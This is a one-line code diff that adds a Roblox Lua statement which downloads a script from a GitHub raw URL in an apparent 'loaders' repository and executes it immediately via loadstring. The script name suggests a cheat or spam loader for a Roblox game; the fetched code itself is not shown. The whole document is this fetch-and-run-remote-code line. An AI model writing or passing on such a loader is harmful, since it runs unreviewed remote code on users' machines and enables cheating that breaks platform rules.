@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/upd-my-anime-mine-spam5-lgrx41tyo9v9po.lua"))()
